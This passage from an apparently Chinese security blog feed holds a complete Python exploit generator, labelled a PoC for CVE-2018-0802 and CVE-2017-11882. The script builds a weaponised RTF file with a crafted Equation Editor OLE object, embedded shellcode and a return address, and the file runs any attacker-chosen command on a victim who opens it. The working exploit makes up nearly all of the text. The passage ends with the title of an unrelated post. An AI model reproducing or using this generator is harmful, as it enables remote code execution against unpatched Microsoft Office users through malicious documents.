class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Evi1cg</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">See the file 'LICENSE' for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">LOGO = <span class="string">R"""</span></span><br><span class="line"><span class="string">      ___                         ___     </span></span><br><span class="line"><span class="string">     /\  \                       /\__\    </span></span><br><span class="line"><span class="string">    /::\  \         ___         /:/ _/_   </span></span><br><span class="line"><span class="string">   /:/\:\__\       /\__\       /:/ /\__\  </span></span><br><span class="line"><span class="string">  /:/ /:/  /      /:/  /      /:/ /:/  /  </span></span><br><span class="line"><span class="string"> /:/_/:/__/___   /:/__/      /:/_/:/  /   </span></span><br><span class="line"><span class="string"> \:\/:::::/  /  /::\  \      \:\/:/  /    </span></span><br><span class="line"><span class="string">  \::/~~/~~~~  /:/\:\  \      \::/__/     </span></span><br><span class="line"><span class="string">   \:\~~\      \/__\:\  \      \:\  \     </span></span><br><span class="line"><span class="string">    \:\__\          \:\__\      \:\__\    </span></span><br><span class="line"><span class="string">     \/__/           \/__/       \/__/ """</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RTF_HEADER = <span class="string">R"""{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}</span></span><br><span class="line"><span class="string">{\*\generator Riched20 6.3.9600}\viewkind4\uc1</span></span><br><span class="line"><span class="string">\pard\sa200\sl276\slmult1\f0\fs22\lang9"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RTF_TRAILER = <span class="string">R"""\par}</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OBJCLASS11882 =<span class="string">R"""{\object\objemb\objupdate{\*\objclass Equation.3}\objw660\objh260{\*\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OBJECT_HEADER = <span class="string">R"""{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata """</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OBJECT_TRAILER = <span class="string">R"""</span></span><br><span class="line"><span class="string">}{\result {\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 {\pict{\*\picprop\shplid1025{\sp{\sn shapeType}{\sv 75}}{\sp{\sn fFlipH}{\sv 0}}</span></span><br><span class="line"><span class="string">{\sp{\sn fFlipV}{\sv 0}}{\sp{\sn fLockAspectRatio}{\sv 1}}{\sp{\sn pictureGray}{\sv 0}}{\sp{\sn pictureBiLevel}{\sv 0}}{\sp{\sn fRecolorFillAsPicture}{\sv 0}}{\sp{\sn fUseShapeAnchor}{\sv 0}}{\sp{\sn fFilled}{\sv 0}}{\sp{\sn fHitTestFill}{\sv 1}}</span></span><br><span class="line"><span class="string">{\sp{\sn fillShape}{\sv 1}}{\sp{\sn fillUseRect}{\sv 0}}{\sp{\sn fNoFillHitTest}{\sv 0}}{\sp{\sn fLine}{\sv 0}}{\sp{\sn fPreferRelativeResize}{\sv 1}}{\sp{\sn fReallyHidden}{\sv 0}}</span></span><br><span class="line"><span class="string">{\sp{\sn fScriptAnchor}{\sv 0}}{\sp{\sn fFakeMaster}{\sv 0}}{\sp{\sn fCameFromImgDummy}{\sv 0}}{\sp{\sn fLayoutInCell}{\sv 1}}}\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0</span></span><br><span class="line"><span class="string">\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307{\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02</span></span><br><span class="line"><span class="string">00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}"""</span></span><br><span class="line"></span><br><span class="line">OBJECT_TRAILER11882 =<span class="string">R"""</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000C5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A600190160A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A000000313131313131313131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F0010000030000000000</span></span><br><span class="line"><span class="string">}{\result {\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 {\pict{\*\picprop\shplid1025{\sp{\sn shapeType}{\sv 75}}{\sp{\sn fFlipH}{\sv 0}}</span></span><br><span class="line"><span class="string">{\sp{\sn fFlipV}{\sv 0}}{\sp{\sn fLockAspectRatio}{\sv 1}}{\sp{\sn pictureGray}{\sv 0}}{\sp{\sn pictureBiLevel}{\sv 0}}{\sp{\sn fRecolorFillAsPicture}{\sv 0}}{\sp{\sn fUseShapeAnchor}{\sv 0}}{\sp{\sn fFilled}{\sv 0}}{\sp{\sn fHitTestFill}{\sv 1}}</span></span><br><span class="line"><span class="string">{\sp{\sn fillShape}{\sv 1}}{\sp{\sn fillUseRect}{\sv 0}}{\sp{\sn fNoFillHitTest}{\sv 0}}{\sp{\sn fLine}{\sv 0}}{\sp{\sn fPreferRelativeResize}{\sv 1}}{\sp{\sn fReallyHidden}{\sv 0}}</span></span><br><span class="line"><span class="string">{\sp{\sn fScriptAnchor}{\sv 0}}{\sp{\sn fFakeMaster}{\sv 0}}{\sp{\sn fCameFromImgDummy}{\sv 0}}{\sp{\sn fLayoutInCell}{\sv 1}}}\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0</span></span><br><span class="line"><span class="string">\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307{\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02</span></span><br><span class="line"><span class="string">00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}\par}</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OBJDATA_TEMPLATE = <span class="string">R"""</span></span><br><span class="line"><span class="string">01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1</span></span><br><span class="line"><span class="string">b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001</span></span><br><span class="line"><span class="string">0000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffe</span></span><br><span class="line"><span class="string">fffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e0074007200790000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000</span></span><br><span class="line"><span class="string">000000000000008020cea5613cd30103000000000200000000000001004f006c0065000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000000000000000000001400000000000000010043006f</span></span><br><span class="line"><span class="string">006d0070004f0062006a000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000120002010100000003000000ffffffff0000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000010000006600000000</span></span><br><span class="line"><span class="string">00000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000012000201ffffffff04000000ff</span></span><br><span class="line"><span class="string">ffffff00000000000000000000000000000000000000000000000000000000000000000000000003</span></span><br><span class="line"><span class="string">0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000fe</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffff01000002080000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02</span></span><br><span class="line"><span class="string">ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e</span></span><br><span class="line"><span class="string">30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000030004</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4</span></span><br><span class="line"><span class="string">ee5b0000000000030101030a0a01085a5a33c099b202c1e2082be2e8ffffffffc35b50648b40308b</span></span><br><span class="line"><span class="string">400899b203c1e21066ba120c03c28d5b1c53ffe02020202000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000004500710075</span></span><br><span class="line"><span class="string">006100740069006f006e0020004e0061007400690076006500000000000000000000000000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000020000200ffffffffffffffffffffffff0000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000000000000000000000000000004000000c500000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000ffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffff00000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">000000000000000000000000000000000000000000000000000000000000000000000000000000ff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000001050000050000000d0000004d</span></span><br><span class="line"><span class="string">45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500</span></span><br><span class="line"><span class="string">000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00</span></span><br><span class="line"><span class="string">050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00</span></span><br><span class="line"><span class="string">ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468</span></span><br><span class="line"><span class="string">54797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e65</span></span><br><span class="line"><span class="string">7720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a6001</span></span><br><span class="line"><span class="string">90160a000000313131313131313131310c000000320a6001100f0a00000031313131313131313131</span></span><br><span class="line"><span class="string">0c000000320a600190070a000000313131313131313131310c000000320a600110000a0000003131</span></span><br><span class="line"><span class="string">31313131313131310a00000026060f000a00ffffffff0100000000001c000000fb02100007000000</span></span><br><span class="line"><span class="string">0000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff</span></span><br><span class="line"><span class="string">7cef1800040000002d01010004000000f0010000030000000000</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">stage1=<span class="string">"\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\x31\xDB\x53\x51\xBE\x64\x3E\x72\x12\x31\xD6\xFF\x16\x53\x66\x83\xEE\x4C\xFF\x10"</span></span><br><span class="line">stage1=stage1.ljust(<span class="number">44</span>,<span class="string">'\x90'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">COMMAND_OFFSET = (<span class="number">0x949</span>+<span class="number">0x2b</span>)*<span class="number">2</span></span><br><span class="line">COMD_LEN = (<span class="number">0x94</span>-<span class="number">0x2b</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ole_exec_primitive</span>(<span class="params">command</span>):</span><br><span class="line">    hex_command = command.encode(<span class="string">"hex"</span>)</span><br><span class="line">    hex_command += (COMD_LEN - <span class="built_in">len</span>(command)) * <span class="string">"20"</span></span><br><span class="line">    hex_command += <span class="string">"2500"</span></span><br><span class="line">    objdata_hex_stream = OBJDATA_TEMPLATE.translate(<span class="literal">None</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">    ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + <span class="built_in">len</span>(hex_command):]</span><br><span class="line">    <span class="keyword">return</span> OBJECT_HEADER + ole_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rtf</span>(<span class="params">header, trailer, command</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(command) &gt; COMD_LEN:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">'[!] Command must be shorter than 109 bytes!'</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    ole = create_ole_exec_primitive(command + <span class="string">" #"</span>)</span><br><span class="line">    payload=<span class="string">'\x1c\x00\x00\x00\x02\x00\x9e\xc4\xa9\x00\x00\x00\x00\x00\x00\x00\xc8\xa7\\\x00\xc4\xee[\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08ZZ'</span></span><br><span class="line">    payload+=stage1</span><br><span class="line">    payload+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x00402114</span>) <span class="comment"># ret</span></span><br><span class="line">    payload+=<span class="string">'\x00'</span>*<span class="number">2</span></span><br><span class="line">    payload+=command</span><br><span class="line">    payload=payload.ljust(<span class="number">197</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    <span class="keyword">return</span> header + ole + OBJECT_TRAILER + OBJCLASS11882 + payload.encode(<span class="string">'hex'</span>) + OBJECT_TRAILER11882  + trailer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrheader</span>(<span class="params">file</span>):</span><br><span class="line">    input_file = <span class="built_in">open</span>(file,<span class="string">"r"</span>).read()</span><br><span class="line">    r_header = input_file.split(<span class="string">"{\*\datastore"</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> r_header</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span> LOGO</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">"PoC for CVE-2018-0802 And CVE-2017-11882"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--command"</span>, <span class="built_in">help</span>=<span class="string">"Command run in target system"</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-o'</span>, <span class="string">"--output"</span>, <span class="built_in">help</span>=<span class="string">"Output exploit rtf"</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--input"</span>, <span class="built_in">help</span>=<span class="string">"Input normal rtf."</span>, required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.<span class="built_in">input</span> != <span class="literal">None</span>:</span><br><span class="line">        r_header = getrheader(args.<span class="built_in">input</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r_header = RTF_HEADER</span><br><span class="line"></span><br><span class="line">    rtf_content = create_rtf(r_header, RTF_TRAILER,  args.command)</span><br><span class="line"></span><br><span class="line">    output_file = <span class="built_in">open</span>(args.output, <span class="string">"w"</span>)</span><br><span class="line">    output_file.write(rtf_content)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">"[*] Done ! output file --&gt; "</span> + args.output </span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Windows </tag>
        
            
            
        <tag> 信息安全 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>使用vscode快速搭建单片机开发环境</title>
      
      
      <link href="/cn/posts/23513/"/>
      
      
      <url>/cn/posts/23513/</url>
      
      
        
